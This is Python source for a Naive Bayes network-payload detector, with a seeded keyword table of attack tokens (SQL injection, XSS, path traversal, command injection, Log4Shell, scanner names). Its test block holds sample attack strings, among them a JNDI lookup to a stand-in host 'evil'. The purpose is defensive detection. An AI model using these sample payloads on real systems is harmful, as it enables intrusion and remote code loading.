import math

try:
    from engines.base import DetectionEngine, Verdict
except ImportError:  # allow `python engines/naive_bayes.py` direct execution
    from base import DetectionEngine, Verdict


# Seed vocabulary, grouped by attack family.
#   word -> (P(word|malicious), P(word|safe))
#
# The interim evaluation recorded Naive Bayes recall of 0.50 and attributed it
# to a "limited seeded vocabulary" (bug B-06): only twelve SQL-oriented tokens
# were present, so any malicious payload that was not SQL injection produced a
# false negative. The table below widens coverage to cross-site scripting,
# path traversal, command injection, template injection, deserialisation and
# scanner fingerprints.
#
# Tokens were chosen for discriminative power rather than volume. Substrings
# that occur in ordinary traffic are deliberately excluded - "curl" and "wget"
# for instance appear in legitimate User-Agent headers, so treating them as
# malicious would trade recall for a large false-positive count.
DEFAULT_LIKELIHOODS = {
    # --- SQL injection ---
    "UNION":            (0.80, 0.0010),
    "SELECT":           (0.85, 0.0500),
    "UNION ALL":        (0.90, 0.0005),
    "OR 1=1":           (0.95, 0.0001),
    "OR '1'='1":        (0.95, 0.0001),
    "SLEEP":            (0.60, 0.0100),
    "BENCHMARK(":       (0.88, 0.0002),
    "WAITFOR DELAY":    (0.92, 0.0001),
    "INFORMATION_SCHEMA": (0.93, 0.0002),
    "GROUP_CONCAT":     (0.85, 0.0010),
    "XP_CMDSHELL":      (0.96, 0.0001),
    "DROP":             (0.40, 0.0200),
    "INSERT":           (0.50, 0.0500),
    "UPDATE":           (0.50, 0.0500),

    # --- cross-site scripting ---
    "SCRIPT":           (0.70, 0.0200),
    "ALERT(":           (0.80, 0.0010),
    "ONERROR":          (0.85, 0.0010),
    "ONLOAD":           (0.75, 0.0050),
    "<IMG":             (0.60, 0.0300),
    "<SVG":             (0.80, 0.0020),
    "JAVASCRIPT:":      (0.82, 0.0020),
    "DOCUMENT.COOKIE":  (0.94, 0.0001),
    "PROMPT(":          (0.78, 0.0020),

    # --- path traversal / local file inclusion ---
    "/ETC/PASSWD":      (0.90, 0.0001),
    "/ETC/SHADOW":      (0.95, 0.0001),
    "../../":           (0.88, 0.0020),
    "..%2F":            (0.92, 0.0001),
    "%2E%2E%2F":        (0.92, 0.0001),
    "/PROC/SELF":       (0.90, 0.0002),
    "BOOT.INI":         (0.88, 0.0002),

    # --- command injection ---
    "/BIN/SH":          (0.90, 0.0005),
    "/BIN/BASH":        (0.88, 0.0010),
    ";CAT ":            (0.85, 0.0010),
    "|CAT ":            (0.85, 0.0010),
    "$(":               (0.55, 0.0300),
    "CHMOD ":           (0.60, 0.0100),

    # --- template / expression injection (incl. Log4Shell) ---
    "${JNDI:":          (0.97, 0.0001),
    "{{7*7}}":          (0.95, 0.0001),
    "<%=":              (0.70, 0.0050),

    # --- scanner and tooling fingerprints ---
    "SQLMAP":           (0.96, 0.0001),
    "NIKTO":            (0.95, 0.0001),
    "ACUNETIX":         (0.95, 0.0001),
    "NESSUS":           (0.93, 0.0002),
    "MASSCAN":          (0.90, 0.0002),

    # --- weak signals: informative but common in ordinary traffic ---
    "ROOT":             (0.30, 0.0800),
    "ADMIN":            (0.40, 0.1000),
}

# These words occur in ordinary URLs, usernames, documentation, and service
# banners. They may add context to a real exploit signature, but must never be
# sufficient to raise a payload alert on their own - even if an imported model
# assigned them an overconfident likelihood.
WEAK_SIGNALS = {"ROOT", "ADMIN"}


class PayloadMonitor(DetectionEngine):
    """Multinomial Naive Bayes over payload tokens.

    Scoring is done in log space rather than by multiplying probabilities.
    A payload matching a dozen tokens would otherwise multiply a dozen values
    below 0.01 and underflow to exactly 0.0 in IEEE-754 double precision,
    making the two class scores indistinguishable (this was bug B-02).
    Summing logarithms is monotonically equivalent and numerically stable:

        log P(class|payload) ~ log P(class) + SUM log P(token|class)
    """

    name = "naive_bayes"
    features = ("payload_bytes",)

    def __init__(self, confidence_threshold=0.80):
        # 10/90 prior - rough guess at malicious vs safe in mixed traffic
        self.prior_malicious = 0.10
        self.prior_safe = 0.90
        self.confidence_threshold = confidence_threshold

        # word -> (P(word|malicious), P(word|safe))
        self.likelihoods = dict(DEFAULT_LIKELIHOODS)

        # used by smoothing if we ever score unseen words
        self.default_malicious_likelihood = 0.001
        self.default_safe_likelihood = 0.01

    def export_brain(self):
        return {
            "prior_malicious": self.prior_malicious,
            "prior_safe": self.prior_safe,
            "likelihoods": {k: list(v) for k, v in self.likelihoods.items()},
        }

    def import_brain(self, data):
        if not isinstance(data, dict):
            return False
        if "prior_malicious" in data:
            self.prior_malicious = float(data["prior_malicious"])
        if "prior_safe" in data:
            self.prior_safe = float(data["prior_safe"])
        if "likelihoods" in data and isinstance(data["likelihoods"], dict):
            new = {}
            for w, pair in data["likelihoods"].items():
                try:
                    new[w.upper()] = (float(pair[0]), float(pair[1]))
                except (TypeError, ValueError, IndexError):
                    pass
            if new:
                self.likelihoods = new
        print("[*] Federate Learning: NaiveBayes loaded %d keyword likelihoods."
              % len(self.likelihoods))
        return True

    def classify(self, payload_bytes):
        try:
            payload = payload_bytes.decode("utf-8", errors="ignore").upper()
        except Exception:
            return "Safe", 0.0, []

        if len(payload) < 3:
            return "Safe", 0.0, []

        log_mal = math.log(self.prior_malicious)
        log_safe = math.log(self.prior_safe)
        found = []

        # only score words actually present - absence shouldn't push
        # the verdict toward 'safe' for short payloads
        for word, (p_mal, p_safe) in self.likelihoods.items():
            if word in payload:
                found.append(word)
                log_mal += math.log(p_mal)
                log_safe += math.log(p_safe)

        # softmax-style normalisation to a 0..1 confidence
        try:
            top = max(log_mal, log_safe)
            em = math.exp(log_mal - top)
            es = math.exp(log_safe - top)
            confidence = em / (em + es)
        except OverflowError:
            confidence = 1.0 if log_mal > log_safe else 0.0

        strong_found = [word for word in found if word not in WEAK_SIGNALS]
        if confidence >= self.confidence_threshold and strong_found:
            return "Malicious", confidence, found
        return "Safe", confidence, found

    # ---- uniform engine interface (NFR-5) ------------------------------
    def analyse(self, payload_bytes):
        verdict, confidence, found = self.classify(payload_bytes)
        return Verdict(
            verdict,
            confidence=confidence,
            detail={"keywords": found, "vocabulary": len(self.likelihoods)},
            is_threat=(verdict == "Malicious"),
        )

    def train(self, samples, laplace=1.0, discover=True, top_n=40):
        """Fit priors and likelihoods from labelled (payload, label) rows.

        When `discover` is set, the vocabulary is *learned* from the corpus by
        log-odds feature selection instead of relying only on the seeded token
        list, which is the principled fix for the low-recall finding: tokens
        that actually separate the two classes in the training data are kept,
        so recall is no longer bounded by whatever was hard-coded.
        """
        rows = [(str(p), str(l)) for p, l in samples]
        malicious = {"MALICIOUS", "ATTACK"}
        n_mal = sum(1 for _, l in rows if l.upper() in malicious)
        n_safe = len(rows) - n_mal
        if n_mal == 0 or n_safe == 0:
            raise ValueError("payload training set must contain both classes")

        vocabulary = set(self.likelihoods)
        if discover:
            vocabulary |= discover_vocabulary(rows, top_n=top_n)

        likelihoods = {}
        for word in vocabulary:
            m = sum(1 for p, l in rows
                    if l.upper() in malicious and word in p.upper())
            s = sum(1 for p, l in rows
                    if l.upper() not in malicious and word in p.upper())
            # Laplace smoothing so an unseen token never yields log(0)
            p_mal = (m + laplace) / (n_mal + 2 * laplace)
            p_safe = (s + laplace) / (n_safe + 2 * laplace)
            likelihoods[word] = (round(p_mal, 6), round(p_safe, 6))

        self.likelihoods = likelihoods
        self.prior_malicious = n_mal / len(rows)
        self.prior_safe = 1.0 - self.prior_malicious
        print("[NB ] %d payloads (mal=%d safe=%d) prior=%.3f vocab=%d"
              % (len(rows), n_mal, n_safe, self.prior_malicious,
                 len(likelihoods)))
        return {"samples": len(rows), "malicious": n_mal, "safe": n_safe,
                "prior_malicious": self.prior_malicious,
                "vocabulary": len(likelihoods)}

    def reset(self):
        self.likelihoods = dict(DEFAULT_LIKELIHOODS)
        self.prior_malicious = 0.10
        self.prior_safe = 0.90
        return True


def _tokenise(text):
    """Split a payload into candidate tokens (alphanumeric runs, 3+ chars)."""
    out, current = [], []
    for ch in text.upper():
        if ch.isalnum() or ch in "_$":
            current.append(ch)
        else:
            if len(current) >= 3:
                out.append("".join(current))
            current = []
    if len(current) >= 3:
        out.append("".join(current))
    return out


def discover_vocabulary(rows, top_n=40, min_count=2):
    """Select the most class-discriminative tokens by log-odds ratio.

    For each candidate token the ratio of its frequency in the malicious class
    to its frequency in the safe class is scored as

        score = | log( (m + 1) / (s + 1) ) |

    and the highest scoring tokens are returned. Tokens that appear in both
    classes at similar rates score near zero and are discarded, so the learned
    vocabulary contains only features that carry signal.
    """
    malicious = {"MALICIOUS", "ATTACK"}
    mal_counts, safe_counts = {}, {}

    for payload, label in rows:
        seen = set(_tokenise(payload))
        target = mal_counts if str(label).upper() in malicious else safe_counts
        for token in seen:
            target[token] = target.get(token, 0) + 1

    scored = []
    for token in set(mal_counts) | set(safe_counts):
        m = mal_counts.get(token, 0)
        s = safe_counts.get(token, 0)
        if m + s < min_count:
            continue
        score = abs(math.log((m + 1.0) / (s + 1.0)))
        scored.append((score, token))

    scored.sort(reverse=True)
    return {token for _, token in scored[:top_n]}


if __name__ == "__main__":
    nb = PayloadMonitor()
    print("seed vocabulary: %d tokens" % len(nb.likelihoods))
    for p in [
        b"GET /index.html HTTP/1.1\r\nHost: google.com",
        b"GET / HTTP/1.1\r\nUser-Agent: curl/8.5.0",
        b"user=admin' UNION SELECT * FROM users --",
        b"GET /?q=<svg onerror=alert(1)>",
        b"GET /?file=../../../etc/passwd",
        b"POST /api {'x':'${jndi:ldap://evil/a}'}",
        b"msg=Did you select the right option?",
    ]:
        v, c, w = nb.classify(p)
        print("%-9s conf=%6.2f%% %s" % (v, c * 100, w[:4]))
